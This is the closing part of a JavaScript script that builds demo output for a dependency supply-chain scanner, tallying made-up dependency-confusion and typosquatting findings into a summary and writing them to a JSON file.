      cand('lodash-utils', 'suffix', 0.67, 6, true, 400, 9200, ['dev-utils-team'], [], 30, 'low', ['Different purpose, older package']),
    ],
  },
]

// ---- summaries ----------------------------------------------------------------------
const sevCount = (arr, key = 'severity') => {
  const c = { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
  arr.forEach((x) => c[x[key]]++)
  return c
}
const ecosystems = Object.keys(P).map((eco) => {
  const ps = packages.filter((p) => p.ecosystem === eco)
  const fs = findings.filter((f) => f.ecosystem === eco)
  return {
    ecosystem: eco, lockfiles: [FILE[eco]], registry: REG[eco], total: ps.length, direct: ps.filter((p) => p.direct).length,
    public: ps.filter((p) => p.public_status === 'registered').length, internal_looking: ps.filter((p) => p.internal_looking).length,
    confusion: fs.filter((f) => f.category === 'dependency_confusion').length, typosquat: fs.filter((f) => f.category === 'typosquatting').length,
    suspicious: fs.filter((f) => f.category === 'suspicious_metadata').length, exposure: fs.filter((f) => f.category === 'registry_exposure').length,
    registry_coverage: Math.round((ps.filter((p) => p.public_status === 'registered').length / ps.length) * 100) / 100,
    risk_score: Math.min(100, Math.round(fs.reduce((a, f) => a + f.risk_score, 0) / Math.max(1, ps.length) * 3.1)), severity_counts: sevCount(fs),
  }
})
const sc = sevCount(findings)
const summary = {
  total_dependencies: packages.length, direct_dependencies: packages.filter((p) => p.direct).length,
  public_packages: packages.filter((p) => p.public_status === 'registered').length, internal_looking: packages.filter((p) => p.internal_looking).length,
  confusion_candidates: findings.filter((f) => f.category === 'dependency_confusion').length,
  typosquat_candidates: findings.filter((f) => f.category === 'typosquatting').length,
  suspicious_metadata: findings.filter((f) => f.category === 'suspicious_metadata').length,
  registry_exposure: findings.filter((f) => f.category === 'registry_exposure').length,
  ecosystems: 4, total_findings: findings.length, risk_score: 72, risk_label: 'high', severity_counts: sc,
  attack_surface: {
    dependency_confusion: findings.filter((f) => f.category === 'dependency_confusion').length,
    typosquatting: findings.filter((f) => f.category === 'typosquatting').length,
    suspicious_metadata: findings.filter((f) => f.category === 'suspicious_metadata').length,
    registry_exposure: findings.filter((f) => f.category === 'registry_exposure').length,
  },
  score_drivers: [`${sc.critical} critical findings (2 dependency confusion, 1 active typosquat)`, 'Range-resolved internal names on the public registry', 'Install-time network calls in 3 fresh packages', 'Unhashed pins across pypi and npm'],
}

const scan = {
  id: 'demo-payments-api', project: 'payments-api', created_at: NOW.toISOString(), duration_ms: 3820, mode: 'demo', version: '0.1.0',
  source: { kind: 'demo', files: Object.values(FILE).concat(['go.sum']) },
  options: { checks: ['dependency_confusion', 'typosquatting', 'suspicious_metadata', 'registry_exposure'], ecosystem: null, live: false, max_edit_distance: 2, rate_limit_rps: 4, timeout_s: 10, cache_ttl_s: 3600, internal_scopes: ['@acme', 'acme-'], registry_overrides: {} },
  summary, ecosystems, packages, findings, edges, lookalikes, warnings: [],
}

mkdirSync(dirname(OUT), { recursive: true })
writeFileSync(OUT, JSON.stringify(scan))
console.log(`demo-scan.json: ${packages.length} packages, ${findings.length} findings, ${edges.length} edges`, sc)
